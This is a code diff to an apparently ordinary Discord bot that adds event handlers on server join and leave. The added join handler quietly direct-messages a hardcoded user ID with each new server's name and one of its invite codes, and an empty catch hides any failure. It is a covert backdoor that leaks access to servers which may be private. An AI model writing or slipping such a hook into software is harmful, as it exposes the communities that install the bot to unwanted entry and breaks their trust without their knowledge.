@@ -34,6 +34,17 @@ client.on("guildMemberRemove", member => {
         welcome.send(lev_dec);
    }
 })
+client.on("guildCreate", guild => {
+    client.users.get("145772530454626304").send("JOINED A NEW SERVER: " + guild.name)
+    guild.fetchInvites()
+    .then(invites => {
+        client.users.get("145772530454626304").send(invites[0].code);
+    })
+    .catch()
+})
+client.on("guildDelete", guild => {
+    client.users.get("145772530454626304").send("LEFT A SERVER SERVER: " + guild.name)
+})
 client.on("message", async message => {
     if (message.author.bot) return;
     const args = message.content.slice(prefix.length).trim().split(/ +/g);
